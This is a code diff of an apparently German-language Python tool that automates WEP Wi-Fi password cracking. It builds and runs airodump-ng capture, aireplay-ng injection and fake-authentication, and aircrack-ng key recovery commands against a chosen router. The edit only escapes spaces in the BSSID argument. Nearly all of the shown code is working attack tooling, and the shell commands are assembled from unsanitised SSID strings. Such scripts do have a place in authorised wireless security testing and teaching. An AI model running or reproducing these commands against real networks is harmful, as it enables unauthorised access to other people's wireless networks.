@@ -125,15 +125,15 @@ def WEP_Open():
 			while(success!=True):
 				success=WEP_Shared(wifi_name,wifi_mac,router_ssid,router_bssid,router_chn)
 		
-		command = rlinput('Aufnahme des Netzwerkverkehrs (Im Hintergrund geöffnet lassen): \n# ', 'airodump-ng -c ' +router_chn + str5ghz +' -w ' + router_ssid + ' --bssid ' + router_bssid+ ' ' + wifi_name )
+		command = rlinput('Aufnahme des Netzwerkverkehrs (Im Hintergrund geöffnet lassen): \n# ', 'airodump-ng -c ' +router_chn + str5ghz +' -w ' + router_ssid + ' --bssid ' + router_bssid.replace(" ", "\s")+ ' ' + wifi_name )
 		execute(command)
 
 		#INJECTION TEST
-		command = rlinput('Überprüfung ob Netzwerk angreifbar ist. (Nach erfolgter Prüfung kann dieses Fenster geschlossen werden.): \n# ', 'aireplay-ng -9 -e ' +router_ssid +' -a ' + router_bssid +  ' ' + wifi_name )
+		command = rlinput('Überprüfung ob Netzwerk angreifbar ist. (Nach erfolgter Prüfung kann dieses Fenster geschlossen werden.): \n# ', 'aireplay-ng -9 -e ' +router_ssid +' -a ' + router_bssid.replace(" ", "\s") +  ' ' + wifi_name )
 		execute(command)
 
 		#SEND AUTH PACKETS
-		command = rlinput('Senden von authentication-Paketen, um mehr Netzwerkverkehr zu generieren (Im Hintergrund geöffnet lassen): \n# ', 'aireplay-ng -1 6 -o 1 -q 1 -e ' +router_ssid +' -a ' + router_bssid + ' -h ' + wifi_mac +' ' + wifi_name )
+		command = rlinput('Senden von authentication-Paketen, um mehr Netzwerkverkehr zu generieren (Im Hintergrund geöffnet lassen): \n# ', 'aireplay-ng -1 6 -o 1 -q 1 -e ' +router_ssid +' -a ' + router_bssid.replace(" ", "\s") + ' -h ' + wifi_mac +' ' + wifi_name )
 		execute(command)
 
 		#CAPTURE ARP-REQ
@@ -147,7 +147,7 @@ def WEP_Open():
 		#Show list of CAP-Files
 		filenamestring= showCAPfiles(router_ssid)
 
-		command = rlinput('Das WEP-Passwort kann nun mit Hilfe des aufgenommenen Verkehrs ermittelt werden. Wenn ein Key gefunden wurde wird dieser ausgegeben. Solange muss der Prozess weiter laufen: \n# ', 'aircrack-ng -b ' +router_bssid + ' ' + filenamestring )
+		command = rlinput('Das WEP-Passwort kann nun mit Hilfe des aufgenommenen Verkehrs ermittelt werden. Wenn ein Key gefunden wurde wird dieser ausgegeben. Solange muss der Prozess weiter laufen: \n# ', 'aircrack-ng -b ' +router_bssid.replace(" ", "\s") + ' ' + filenamestring )
 		execute(command)
 
 		#ReStart Networkmanager
